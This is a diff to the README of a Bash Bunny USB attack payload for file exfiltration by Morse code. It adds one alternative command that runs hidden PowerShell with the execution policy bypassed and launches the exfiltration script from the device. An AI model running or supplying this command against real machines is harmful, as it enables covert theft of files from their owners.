@@ -25,6 +25,9 @@ The payload uses a base64 encode version of the payload (b.txt) to get round the
 
 Please check the encoded payload before execution, to make sure it has not been replaced with something more malicious. 
 
+If you do not want to use the base64 version you could change the pay load to:
+`RUN WIN "powerShell -Noni -NoP -W h -EP Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\MorseCodeFileExfiltration.ps1')"`
+
 ## Colors
 | Status    | Color                         | Description                                      |
 | --------- | ------------------------------| ------------------------------------------------ |
